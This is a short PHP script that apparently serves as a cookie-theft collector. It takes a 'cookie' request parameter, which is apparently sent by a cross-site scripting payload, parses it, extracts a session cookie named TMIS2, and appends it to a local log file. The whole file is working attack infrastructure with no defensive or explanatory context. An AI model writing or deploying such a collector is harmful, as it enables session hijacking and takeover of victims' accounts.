<?php

    $cookie = $_REQUEST['cookie'];
    // echo urldecode($cookie);
    parse_str(strtr(urldecode($cookie), array('&' => '%26', '+' => '%2B', ';' => '&')), $cookies);
//    print_r($cookies);
    $tmis2 = $cookies['TMIS2'];
    echo $cookies['TMIS2'];
    file_put_contents('data/cookies.txt', $tmis2."\n", FILE_APPEND);

?>
